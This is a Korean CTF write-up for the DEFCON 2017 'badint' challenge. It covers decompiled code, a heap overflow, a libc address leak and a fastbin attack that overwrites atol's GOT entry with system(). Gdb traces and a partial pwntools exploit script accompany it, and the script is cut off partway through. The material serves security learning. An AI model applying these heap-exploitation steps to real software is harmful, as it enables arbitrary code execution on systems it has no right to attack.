---
title: "Potent Pwnables) BADINT"
sidebar_position: 1
---
## **Information**

### **Description**
```
Enjoy some badint at badint\_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me:21813

Files: https://2017.notmalware.ru/77a32de822a9c8a44e67e653b0d210093e5f6925/badint
```
### **File**

* [badint](/attachments/1147545/1147544.bin)

### **Source Code**

## **Writeup**

### File information

```sh title="File information"
lazenca0x0@ubuntu:~/Documents/CTF/DEFCON2017/Pwnable/badint$ file badint 
badint: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=f8abe4738fe642dbc7332dc51de34f1c79d54399, stripped
lazenca0x0@ubuntu:~/Documents/CTF/DEFCON2017/Pwnable/badint$ checksec.sh --file badint
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   badint
lazenca0x0@ubuntu:~/Documents/CTF/DEFCON2017/Pwnable/badint$
```

### **Binary analysis**

#### **struct**

* 다음과 같은 구조체를 사용합니다.

```c title="struct INFO"
struct INFO
{
  INFO *next;
  INFO *pre;
  SEQINFO *seqInfo;
  _WORD offset;
  _BYTE len;
  _QWORD CopyData;
};
```

```c title="struct SEQINFO"
struct SEQINFO
{
  _DWORD count;
  INFO *first;
  INFO *last;
};
```

```c title="struct SEQALLINFO"  
struct SEQALLINFO
{
  _WORD AllDataSize;
  SEQINFO seqInfo;
  _BYTE seqNumber;
};
```

#### **Main**

* 해당 함수는 다음과 같은 기능을 합니다.

  + 255개의 SEQALLINFO 구조체를 생성하고, 초기화 후에 gSeqList[] 에 저장합니다.
  + Menu() 함수를 호출합니다.
  + gSeqList[] 에 저장된 SEQALLINFO 구조체의 메모리를 해제 합니다.

```c title="main()"
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  SEQALLINFO *seqInfo; // rbx@2 MAPDST
  __int64 v4; // rdx@2
  FILE *v5; // rdi@4
  __int64 v6; // rdx@4
  __int64 v7; // rdx@4
  unsigned int j; // [rsp+8h] [rbp-18h]@4
  unsigned int i; // [rsp+Ch] [rbp-14h]@1
  void *retaddr; // [rsp+28h] [rbp+8h]@1

  _cyg_profile_func_enter(main, retaddr, a3);
  for ( i = 0; i <= 255; ++i )
  {
    seqInfo = (SEQALLINFO *)operator new(40uLL);
    setSeqData(seqInfo, i, v4);
    gSeqList[(unsigned __int64)i] = seqInfo;
  }
  signal(14, handler);
  alarm(600u);
  signal(6, sub_400D03);
  v5 = stdout;
  setvbuf(stdout, 0LL, 2, 0LL);
  Menu((__int64)v5, 0LL, v6);
  for ( j = 0; j <= 255; ++j )
  {
    seqInfo = gSeqList[(unsigned __int64)j];
    if ( seqInfo )
    {
      delSeqData((__int64)gSeqList[(unsigned __int64)j], 0LL, v7);
      operator delete(seqInfo);
    }
  }
  exit(0xFFFFFFFFLL);
}
```

#### **Menu()**

* 해당 함수는 다음과 같은 기능을 합니다.
  + 사용자로 부터 SEQ, Offset, Data를 입력 받습니다.
  + 입력 받은 데이터는 DataCopyToHeap() 함수를 이용해 Heap 영역에 복사됩니다.
  + setSeqAllInfo() 함수를 이용해 Data를 저장하고, Seq 정보를 관리합니다.
  + 사용자로 부터 "LSF Yes/No:" 질문에 대한 값을 입력 받습니다.
  + "Yes" 일 경우 다음과 같이 동작합니다.
    - getAssembledData() 함수를 이용해 저장된 Data가 저장된 주소를 리턴합니다.
    - gSeqList[], DATAINFO에 저장된 Seq 정보를 재정의 합니다.
    - 리턴된 주소에 저장된 내용을 출력합니다.

```c title="Menu()"
__int64 __fastcall Menu(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdx@20
  char UserInput[1024]; // [rsp+0h] [rbp-440h]@2
  unsigned int lenAssembled; // [rsp+408h] [rbp-38h]@20
  unsigned int lenData; // [rsp+40Ch] [rbp-34h]@7
  char *assembledData; // [rsp+410h] [rbp-30h]@20
  void *tmpCopyData; // [rsp+418h] [rbp-28h]@7
  unsigned int offset; // [rsp+420h] [rbp-20h]@5
  unsigned int seq; // [rsp+424h] [rbp-1Ch]@3
  char v12; // [rsp+42Ah] [rbp-16h]@1
  char lsf; // [rsp+42Bh] [rbp-15h]@2
  unsigned int i; // [rsp+42Ch] [rbp-14h]@21
  void *retaddr; // [rsp+448h] [rbp+8h]@1

  _cyg_profile_func_enter(Menu, retaddr, a3);
  v12 = 0;
  while ( v12 != 1 )
  {
    lsf = 0;
    printf("SEQ #: ");
    if ( fgets(UserInput, 255, stdin) == 0LL )
      break;
    seq = atol(UserInput);
    if ( seq > 0xFF )
      break;
    printf("Offset: ", 255LL);
    if ( fgets(UserInput, 255, stdin) == 0LL )
      break;
    offset = atol(UserInput);
    if ( offset > 0xFFFF )
      break;
    printf("Data: ", 255LL);
    if ( fgets(UserInput, 768, stdin) == 0LL )
      break;
    lenData = 0;
    tmpCopyData = DataCopyToHeap(UserInput, &lenData, (__int64)&lenData);
    if ( !lenData || !tmpCopyData )
      break;
    if ( lenData <= 0xFF )
    {
      printf("LSF Yes/No: ", &lenData);
      if ( fgets(UserInput, 768, stdin) == 0LL )
        return _cyg_profile_func_exit(Menu, retaddr);
      if ( UserInput[0] != 'Y' || UserInput[1] != 'e' || UserInput[2] != 's' )
      {
        if ( UserInput[0] != 'N' || UserInput[1] != 'o' )
          return _cyg_profile_func_exit(Menu, retaddr);
        lsf = 0;
      }
      else
      {
        lsf = 1;
      }
      printf("RX PDU [%d] [len=%d]\n", seq, lenData);
      setSeqAllInfo(gSeqList[(unsigned __int64)seq], offset, (__int64)tmpCopyData, lenData);
      operator delete(tmpCopyData);
      if ( lsf )
      {
        assembledData = (char *)getAssembledData(gSeqList[(unsigned __int64)seq], &lenAssembled, (__int64)&lenAssembled);
        if ( !assembledData )
          return _cyg_profile_func_exit(Menu, retaddr);
        AllRelocation(gSeqList[(unsigned __int64)seq], (__int64)&lenAssembled, v3);
        printf("Assembled [seq: %u]: ", seq);
        for ( i = 0; i < lenAssembled; ++i )
          printf("%02x", (unsigned __int8)assembledData[i]);
        puts("\n");
        operator delete(assembledData);
      }
    }
    else
    {
      puts("Invalid data");
      sub_40227C("Invalid data");
    }
  }
  return _cyg_profile_func_exit(Menu, retaddr);
}
```

#### **DataCopyToHeap()**

* 해당 함수는 다음과 같은 기능을 합니다.
  + 사용자로 부터 입력받은 문자열의 길이의 절반을 Heap 영역에 할당합니다.
  + 사용자로 부터 입력받은 문자열에서 문자를 한개씩 추출해 4bit로 변경한 다음 할당된 Heap 영역에 저장합니다.
    - Ex) AA → 0x4141 → 0xAA
  + lenData에는 다음과 같은 값이 저장됩니다.
    - count가 홀수일 경우 : data 문자열 길이 / 2 + 1
    - count가 짝수일 경우 : data 문자열 길이 / 2

```c title="DataCopyToHeap"
char *__fastcall DataCopyToHeap(const char *data, unsigned int *lenData, __int64 a3)
{
  size_t dataLen; // rax@1
  char firstOfTwoChar; // r12@4
  unsigned __int8 *getChar; // rax@4 MAPDST
  char *savedData; // [rsp+10h] [rbp-20h]@1
  unsigned int count; // [rsp+1Ch] [rbp-14h]@1
  __int64 retaddr; // [rsp+38h] [rbp+8h]@1

  _cyg_profile_func_enter(DataCopyToHeap, retaddr, a3);
  dataLen = strlen(data);
  savedData = (char *)operator new[](dataLen >> 1);
  count = 0;
  while ( *data && *data != '\n' )
  {
    if ( count & 1 )
    {
      firstOfTwoChar = 16 * savedData[count >> 1];
      getChar = (unsigned __int8 *)data++;
      savedData[count >> 1] = firstOfTwoChar | (unsigned __int64)charTo1Byte(*getChar, retaddr, (__int64)data);
    }
    else
    {
      getChar = (unsigned __int8 *)data++;
      savedData[count >> 1] = charTo1Byte(*getChar, retaddr, (__int64)data);
    }
    ++count;
  }
  if ( count & 1 )
    *lenData = (count >> 1) + 1;
  else
    *lenData = count >> 1;
  _cyg_profile_func_exit(DataCopyToHeap, retaddr);
  return savedData;
}
```

#### **getAssembledData()**

* 해당 함수는 다음과 같은 기능을 합니다.
  + SEQALLINFO의 AllDataSize에 저장된 값만큼 Heap memory를 생성합니다.
    - 해당 SEQ 번호로 저장된 DATA의 길이 / 2 = AllDataSize
  + getFirstDataAddr(), getNextDataAddr() 함수를 이용해 해당 SEQ 번호로 저장된 DATAINFO(Addresss)를 추출합니다.
  + 추출된 DATAINFO 구조체에서 Data 길이(dataLen), 저장된 주소(dataAddr), offset 정보를 추출합니다.
  + memcpy() 함수를 이용해 allData + offset 영역에 dataAddr의 내용을 dataLen 만큼 복사합니다.
* 여기에서 Heap Overflow가 발생합니다.
  + offset 값에 의해 복사될 주소 값이 변경될 수 있습니다.

```c title="getAssembledData"
__int64 __fastcall getAssembledData(SEQALLINFO *seqAllInfo, _DWORD *lenAssembled, __int64 a3)
{
  DATAINFO *v3; // rsi@1
  __int64 v5; // rdx@3
  __int64 v6; // rdx@3
  size_t dataLen; // r12@4
  __int64 v8; // rdx@4
  const void *dataAddr; // rbx@4
  __int64 v10; // rdx@4
  unsigned __int16 offset; // ax@4
  __int64 allData; // [rsp+10h] [rbp-20h]@3 MAPDST
  DATAINFO *dataInfo; // [rsp+18h] [rbp-18h]@3
  __int64 retaddr; // [rsp+38h] [rbp+8h]@1

  v3 = (DATAINFO *)retaddr;
  _cyg_profile_func_enter(getAssembledData, retaddr, a3);
  if ( seqAllInfo->AllDataSize )
  {
    allData = operator new[](seqAllInfo->AllDataSize);
    for ( dataInfo = getFirstDataAddr(&seqAllInfo->seqInfo, retaddr, v5);
          dataInfo;
          dataInfo = (DATAINFO *)getNextDataAddr(&seqAllInfo->seqInfo, dataInfo, (__int64)&seqAllInfo->seqInfo) )
    {
      dataLen = (unsigned __int8)getDataLen(dataInfo, (__int64)v3, v6);
      dataAddr = (const void *)getDataAddr(dataInfo, (__int64)v3, v8);
      offset = getOffset(dataInfo, (__int64)v3, v10);
      memcpy((void *)(offset + allData), dataAddr, dataLen);
      v3 = dataInfo;
    }
    *lenAssembled = seqAllInfo->AllDataSize;
  }
  else
  {
    *lenAssembled = 0;
    allData = 0LL;
  }
  _cyg_profile_func_exit(getAssembledData, retaddr);
  return allData;
}
```

#### **setInfo(0x401378)**

* 해당 함수는 다음과 같은 기능을 합니다.
  + 해당 함수는 setSeqAllInfo() 함수에서 호출합니다.
  + 새로운 Heap 공간을 할당해 사용자로 부터 입력받은 "Data" 내용을 복사합니다.
  + 할당된 Heap 주소는 INFO 구조체의 CopyData에 저장됩니다.

```c title="setInfo"
__int64 __fastcall setInfo(INFO *info, __int16 offset, void *tmpCopyData, unsigned __int8 lenData)
{
  __int64 v6; // rdx@1
  __int64 retaddr; // [rsp+38h] [rbp+8h]@1

  _cyg_profile_func_enter(setInfo, retaddr, tmpCopyData);
  setAddrInfo(info, retaddr, v6);
  info->CopyData = operator new[]((unsigned int)lenData + 1);
  memcpy((void *)info->CopyData, tmpCopyData, lenData);
  info->offset = offset;
  info->len = lenData;
  return _cyg_profile_func_exit(setInfo, retaddr);
}
```

### Vulnerability code

#### **Heap Overflow**

```c title="vulnerable code in getAssembledData"
__int64 __fastcall getAssembledData(SEQALLINFO *seqAllInfo, _DWORD *lenAssembled, __int64 a3)
{
...
    allData = operator new[](seqAllInfo->AllDataSize);
    for ( dataInfo = getFirstDataAddr(&seqAllInfo->seqInfo, retaddr, v5);
          dataInfo;
          dataInfo = (DATAINFO *)getNextDataAddr(&seqAllInfo->seqInfo, dataInfo, (__int64)&seqAllInfo->seqInfo) )
    {
      dataLen = (unsigned __int8)getDataLen(dataInfo, (__int64)v3, v6);
      dataAddr = (const void *)getDataAddr(dataInfo, (__int64)v3, v8);
      offset = getOffset(dataInfo, (__int64)v3, v10);
      memcpy((void *)(offset + allData), dataAddr, dataLen);
      v3 = dataInfo;
    }
...
```

### Structure of Exploit code

:::note[Description]
* libc leak
  + offset 값으로 8, Data 값으로 문자 256개 입력
* Heap Overflow
  + Fake chunk 구조를 저장할 공간 생성
  + .got.plt 영역을 덮어쓸 내용을 저장할 공간 생성
    - atol@got.plt 영역에 system() 함수의 주소를 저장
* "SEQ"의 값으로 "sh" 입력
:::

* The following information is required for an attack:
:::note
* libc addresss leak
* Heap Overflow
* Fake chunk
:::

### **Information for attack**

#### **libc addresss leak**

* 다음과 같은 방법으로 addresss를 추출할 수 있습니다.
  + Small bin을 이용해 base addresss 추출 할 수 있습니다.
  + DataCopyToHeap() 함수에서 operator new[]()를 이용해 Heap 영역을 생성합니다.
    - 생성되는 Heap의 형태는 Small bin(0x80 보다 큰 size)입니다.
  + DataCopyToHeap() 함수에서 생성된 Heap 영역은 setSeqAllInfo() 호출 뒤에 해제됩니다.  
    - Small bin을 해제하면 unsorted bin에 Small bin이 등록 되고, Free chunk 구조로 변환됩니다.
    - Free chunk에서 fd, bk영역에 추출할 base addresss가 저장되어 있습니다.
  + "LSF :"의 입력 값으로 "Yes"를 입력하면getAssembledData() 함수에서 Heap 영역을 생성합니다.
    - 생성되는 Heap 의 size는 seqAllInfo→AllDataSize 입니다.
    - DataCopyToHeap()에서 생성한 Heap의 size와 seqAllInfo→AllDataSize 가 같다면, 앞에서 해제된 Free chunk영역을 재사용합니다.
  + Offset 값으로 8을 전달해서 fd영역에 저장된 값을 출력합니다.

```bash
gdb-peda$ r
Starting program: /home/lazenca0x0/Documents/CTF/DEFCON2017/Pwnable/badint/badint 
SEQ #: 0
Offset: 8
Data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Breakpoint 1, 0x0000000000400ddc in ?? ()
gdb-peda$ n
0x0000000000400de1 in ?? ()
gdb-peda$ x/20gx 0x619c20
0x619c20:	0x0000000000000000	0x0000000000000000
0x619c30:	0x0000000000000000	0x0000000000000000
0x619c40:	0x0000000000000000	0x0000000000000000
0x619c50:	0x0000000000000000	0x0000000000000000
0x619c60:	0x0000000000000000	0x0000000000000000
0x619c70:	0x0000000000000000	0x0000000000000000
0x619c80:	0x0000000000000000	0x0000000000000000
0x619c90:	0x0000000000000000	0x0000000000000000
0x619ca0:	0x0000000000000000	0x000000000001d361
0x619cb0:	0x0000000000000000	0x0000000000000000
gdb-peda$ c
Continuing.
LSF Yes/No: Yes
RX PDU [0] [len=128]
Breakpoint 2, 0x0000000000401122 in ?? ()
gdb-peda$ n
0x0000000000401127 in ?? ()
gdb-peda$ x/20gx 0x619c20
0x619c20:	0x00007ffff76a67b8	0x00007ffff76a67b8
0x619c30:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c40:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c50:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c60:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c70:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c80:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c90:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619ca0:	0x0000000000000090	0x0000000000000030
0x619cb0:	0x0000000000000000	0x0000000000000000
gdb-peda$ b *0x04017CB
Breakpoint 3 at 0x4017cb
gdb-peda$ c
Continuing.
Breakpoint 3, 0x00000000004017cb in ?? ()
gdb-peda$ i r rdi
rdi            0x619c28	0x619c28
gdb-peda$ x/20gx 0x619c28 - 0x8
0x619c20:	0x00007ffff76a67b8	0xaaaaaaaaaaaaaaaa
0x619c30:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c40:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c50:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c60:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c70:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c80:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619c90:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x619ca0:	0xaaaaaaaaaaaaaaaa	0x0000000000000031
0x619cb0:	0x0000000000000000	0x0000000000000000
gdb-peda$ c
Continuing.
Assembled [seq: 0]: b8676af7ff7f0000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
SEQ #:
```

#### Heap Overflow

* 다음과 같은 방법으로 fastbin attack를 이용해 .got.plt 영역을 Overwrite 할 수 있습니다.
* 우선 2개의 Heap 공간이 필요합니다.
  + Fake chunk 구조를 저장할 공간(0x68)
  + .got.plt 영역을 덮어쓸 data를 저장할 공간(0x38)

```python title="exploit.py"
...
Add(0,0,'A'*0x68*2,'Yes') #0x71, Space to store Fake chunk
Add(0,0,'B'*0x38*2,'Yes') #0x41, Space to store the data to overwrite the ".got.plt" area
...
```

* 이러한 Heap 공간을 생성하기 전에 확인할 내용이 있습니다.
  + fastbin attack에서 중요한 부분은 다음과 같습니다.
    - malloc()은 fastbin chunk를 할당할 때 해당 chunk의 size와 fd영역에 저장되는 fake chunk의 size가 유효한지 확인합니다.
    - 예를 들어 chunk의 크기가 "0x4\*"이라면, fd영역에 저장되는 fake chunk의 size는 최대 "0x4f"까지 유효합니다.
  + 다음과 같은 .got.plt 영역을 사용할 수 있습니다.
    - 0x604042 <setvbuf@got.plt+2>: 0x0b0600007f8f9cd1 0xc740000000000040
    - 0x604072 <signal@got.plt+2>: 0x0b6600007f8f9cce 0x7650000000000040
    - 0x604082 <alarm@got.plt+2>: 0x0b8600007f8f9cd7 0x0b96000000000040
    - 0x604092 <dlsym@got.plt+2>: 0x0ba6000000000040 0x0bb6000000000040
    - 0x60401a <printf@got.plt+2>: 0x0ab600007f8f9cd0 0xb690000000000040
    - 0x60408a <fclose@got.plt+2>: 0x0b96000000000040 0x0ba6000000000040
  + System()함수의 주소로 Overwrite 할 atol@got.plt 영역과 가장 가까운 0x604042 주소를 fd의 주소로 사용합니다.  
    - malloc()은 fd에 저장된 fake chunk(0x604042)를 하나의 Heap chunk로 인식합니다.
      * prev\_size :  0x7f8f9cd1
      * size : 0x00000040

```bash title="gdb-peda$ x/20gx 0x604002"
gdb-peda$ x/20gx 0x604002
0x604002:	0x8168000000000060	0x86a000007f8f9da3
0x604012:	0x180000007f8f9d82	0x0ab600007f8f9cd0
0x604022 <__gmon_start__@got.plt+2>:	0xb690000000000040	0x8f1000007f8f9cd1
0x604032 <operator new[](unsigned long)@got.plt+2>:	0x6f1000007f8f9d31	0xbe7000007f8f9d31
0x604042 <setvbuf@got.plt+2>:	0x0b0600007f8f9cd1	0xc740000000000040
0x604052 <__libc_start_main@got.plt+2>:	0x9ad000007f8f9ccc	0x6b7000007f8f9cd1
0x604062 <strlen@got.plt+2>:	0x2ea000007f8f9cd3	0x13c000007f8f9cce
0x604072 <signal@got.plt+2>:	0x0b6600007f8f9cce	0x7650000000000040
0x604082 <alarm@got.plt+2>:	0x0b8600007f8f9cd7	0x0b96000000000040
0x604092 <dlsym@got.plt+2>:	0x0ba6000000000040	0x0bb6000000000040
gdb-peda$ x/20gx 0x604002 - 0x8
0x603ffa:	0x3df8000000000000	0x8168000000000060
0x60400a:	0x86a000007f8f9da3	0x180000007f8f9d82
0x60401a <printf@got.plt+2>:	0x0ab600007f8f9cd0	0xb690000000000040
0x60402a <puts@got.plt+2>:	0x8f1000007f8f9cd1	0x6f1000007f8f9d31
0x60403a <operator delete(void*)@got.plt+2>:	0xbe7000007f8f9d31	0x0b0600007f8f9cd1
0x60404a <fopen@got.plt+2>:	0xc740000000000040	0x9ad000007f8f9ccc
0x60405a <fgets@got.plt+2>:	0x6b7000007f8f9cd1	0x2ea000007f8f9cd3
0x60406a <atol@got.plt+2>:	0x13c000007f8f9cce	0x0b6600007f8f9cce
0x60407a <fread@got.plt+2>:	0x7650000000000040	0x0b8600007f8f9cd7
0x60408a <fclose@got.plt+2>:	0x0b96000000000040	0x0ba6000000000040
gdb-peda$
```

* Chuenk의 prev\_size, size의 type은 INTERNAL\_SIZE\_T으로 선언되어 있습니다.
  + 64 비트 컴퓨터에서, 2 ^ 32 개 이상의 malloced 공간을 처리 할 수 없으며, malloc 오버 헤드를 줄일 수 있기 때문에 NTERNAL\_SIZE\_T를 32 비트`unsigned int(4byte) '로 정의한다고 합니다.

```c title="INTERNAL_SIZE_T"
/*
  INTERNAL_SIZE_T is the word-size used for internal bookkeeping
  of chunk sizes.

  The default version is the same as size_t.

While not strictly necessary, it is best to define this as an unsigned type, even if size_t is a signed type. This may avoid some artificial size limitations on some systems.

On a 64-bit machine, you may be able to reduce malloc overhead by defining INTERNAL_SIZE_T to be a 32 bit `unsigned int' at the expense of not being able to handle more than 2^32 of malloced space. 

If this limitation is acceptable, you are encouraged to set this unless you are on a platform requiring 16byte alignments. 

In this case the alignment requirements turn out to negate any potential advantages of decreasing size_t word size.

 Implementors: Beware of the possible combinations of:
     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,
       and might be the same width as int or as long
     - size_t might have different width and signedness as INTERNAL_SIZE_T
     - int and long might be 32 or 64 bits, and might be the same width
  To deal with this, most comparisons and difference computations
  among INTERNAL_SIZE_Ts should cast them to unsigned long, being
  aware of the fact that casting an unsigned int to a wider long does
  not sign-extend. (This also makes checking for negative numbers
  awkward.) Some of these casts result in harmless compiler warnings
  on some systems.
*/

...

struct malloc_chunk {
  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
```

* 기본적인 Heap 공간을 생성한 후 다음과 같은 내용을 Heap 영역에 Overwrite 합니다.
  + getAssembledData() 함수에서 생성한 Heap 영역은 0x670c30 입니다.
  + Overwrite 할 대상으로 부터 0x1d0 떨어져 있습니다.
    - 0x670e00- 0x670c30 = 0x1d0

```bash title="gdb-peda$ i r rax"
Breakpoint 1, 0x0000000000401773 in ?? ()
gdb-peda$ i r rax
rax            0x670c30	0x670c30
gdb-peda$ x/80gx 0x670c30
0x670c30:	0x0000000000000000	0x0000000000000000
0x670c40:	0x0000000000000000	0x0000000000000000
0x670c50:	0x0000000000000000	0x0000000000000000
0x670c60:	0x0000000000000000	0x0000000000000051
0x670c70:	0x0000000000000000	0x0000000000000000
0x670c80:	0x0000000000000000	0x0000000000000000
0x670c90:	0x0000000000000000	0x0000000000000021
0x670ca0:	0x00007f31bd52cb88	0x00007f31bd52cb88
0x670cb0:	0x0000000000000020	0x0000000000000030
0x670cc0:	0x0000000000000000	0x0000000000000000
0x670cd0:	0x000000000066cc58	0x00000000006801d0
0x670ce0:	0x0000000000670e90	0x0000000000000091
0x670cf0:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670d00:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670d10:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670d20:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670d30:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670d40:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670d50:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670d60:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670d70:	0x0000000000000000	0x0000000000000081
0x670d80:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670d90:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670da0:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670db0:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670dc0:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670dd0:	0xaaaaaaaaaaaaaaaa	0xaaaaaaaaaaaaaaaa
0x670de0:	0xaaaaaaaaaaaaaaaa	0x0000000000000000
0x670df0:	0x0000000000000000	0x0000000000000041
0x670e00:	0x0000000000000000	0xbbbbbbbbbbbbbbbb
0x670e10:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x670e20:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x670e30:	0xbbbbbbbbbbbbbbbb	0x0000000000000051
0x670e40:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x670e50:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x670e60:	0xbbbbbbbbbbbbbbbb	0xbbbbbbbbbbbbbbbb
0x670e70:	0xbbbbbbbbbbbbbbbb	0x0000000000000000
0x670e80:	0x0000000000000000	0x0000000000000081
0x670e90:	0x0000000000604042	0x0000000000000000
0x670ea0:	0x0000000000000000	0x0000000000000000
gdb-peda$ p/x 0x670e00- 0x670c30
$1 = 0x1d0
gdb-peda$
```

* 다음과 같은 스크립트를 이용해 fd(0x670e00)영역을 덮어씁니다.

```python title="exploit.py"
# Overwirte fake chunk
payload += p64(0x604042).encode('hex')
payload += p64(0x0).encode('hex') * 6
payload += p64(0x51).encode('hex')
payload += '0' * (0x68*2 - len(payload))
Add(1, 0x1D0, payload, 'Yes')
```

:::note[Overwrite for fd]
| Before | | After | |
| --- | --- | --- | --- |
| 0x0 | 0x8 | 0x0 | 0x8 |
| 0x0000000000000000 | 0x0000000000000041 | 0x0000000000000000 | 0x0000000000000041 |
| 0x0000000000000000 | 0xBBBBBBBBBBBBBBBB | 0x0000000000604042 | 0x0000000000000000 |
| 0xBBBBBBBBBBBBBBBB | 0xBBBBBBBBBBBBBBBB | 0x0000000000000000 | 0x0000000000000000 |
| 0xBBBBBBBBBBBBBBBB | 0xBBBBBBBBBBBBBBBB | 0x0000000000000000 | 0x0000000000000000 |
| 0xBBBBBBBBBBBBBBBB | 0x0000000000000051 | 0x0000000000000000 | 0x0000000000000051 |
| 0xBBBBBBBBBBBBBBBB | 0xBBBBBBBBBBBBBBBB | 0x0000000000000000 | 0x0000000000000000 |
| 0xBBBBBBBBBBBBBBBB | 0xBBBBBBBBBBBBBBBB | 0x0000000000000000 | 0x0000000000000000 |
| 0xBBBBBBBBBBBBBBBB | 0xBBBBBBBBBBBBBBBB | 0x0000000000000000 | 0xBBBBBBBBBBBBBBBB |
:::

* fd영역을 Overwrite한 후 setInfo() 함수에서 생성한 Heap 주소로 .got.plt영역이 할당됩니다.

```bash title="gdb-peda$ i r rax"
Breakpoint 3, 0x00000000004013bb in ?? ()
gdb-peda$ n
gdb-peda$ i r rax
rax            0x604052	0x604052
gdb-peda$ x/10gx 0x604052
0x604052 <__libc_start_main@got.plt+2>:	0x6ad000007f31bd18	0x3b7000007f31bd1d
0x604062 <strlen@got.plt+2>:	0xfea000007f31bd1f	0xe3c000007f31bd19
0x604072 <signal@got.plt+2>:	0x0b6600007f31bd19	0x4650000000000040
0x604082 <alarm@got.plt+2>:	0x0b8600007f31bd23	0x0b96000000000040
0x604092 <dlsym@got.plt+2>:	0x0ba6000000000040	0x0bb6000000000040
gdb-peda$
```

## **Exploit Code**

* **해당 Exploit code에서는 .got.plt 영역을 Overwrite했지만, 공개된 다른 Writeups을 보면 malloc\_hook 영역을 사용한 것도 볼 수 있습니다.**

```python title="exploit.py"
from pwn import *

BINARY_PATH = './badint'
p = process(BINARY_PATH)
binary = ELF(BINARY_PATH)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def Add(seq, offset, data,lsf):
    p.sendlineafter('SEQ #: ', str(seq))
    p.sendlineafter('Offset: ',str(offset))
    p.sendlineafter('Data: ',data)
    p.sendlineafter('LSF Yes/No: ',lsf)

#libc Leak
Add(0, 8, 'A'*256,'Yes')

data = p.recvuntil('0000').split(':')[2].strip()
libcleak = u64(data.decode('hex'))

libc.addresss = libcleak - 0x3c3b78
log.info("libc leak : " + hex(libcleak))
log.info("libc base : " + hex(libc.addresss))
log.info("System()  : " + hex(libc.symbols['system']))

Add(0,0,'A'*0x68*2,'Yes')
Add(0,0,'B'*0x38*2,'Yes')
# Overwrite fake chunk
payload = p64(0x604042).encode('hex')
payload += p64(0x0).encode('hex') * 6
payload += p64(0x51).encode('hex')
log.info("payload : " + str(len(payload)))
payload += '0' * (0x68*2 - len(payload))

Add(1, 0x1d0, payload, 'Yes')

log.info(".plt fgets : " + str(hex(binary.plt['fgets'])))
log.info(".plt strlen: " + str(hex(binary.plt['strlen'])))

# Overwrite the "got.plt" area
payload =  "L"*12
